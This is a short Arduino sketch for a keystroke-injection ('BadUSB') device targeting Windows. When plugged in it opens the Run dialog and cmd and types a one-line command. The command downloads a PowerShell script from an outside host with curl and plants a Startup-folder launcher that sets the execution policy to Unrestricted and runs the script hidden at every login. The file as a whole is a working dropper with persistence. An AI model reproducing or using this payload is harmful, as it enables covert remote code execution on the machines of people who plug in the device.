#include <Keyboard.h>
#include <Mouse.h>

void setup() {
  Keyboard.begin();
  Mouse.begin();
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("cmd");

  delay(2000);

  Keyboard.println("cd \"%USERPROFILE%\\Start Menu\\Programs\\\" && curl -o sus.ps1 https://spea.cc/hackathon/sus.ps1 && cd Startup && echo powershell -Command \"Set-ExecutionPolicy -Scope CurrentUser Unrestricted\" ^&^& start powershell -noexit -windowstyle hidden -file ../sus.ps1 ^&^& exit> sus.cmd && start sus.cmd && exit");
}

void loop() {}
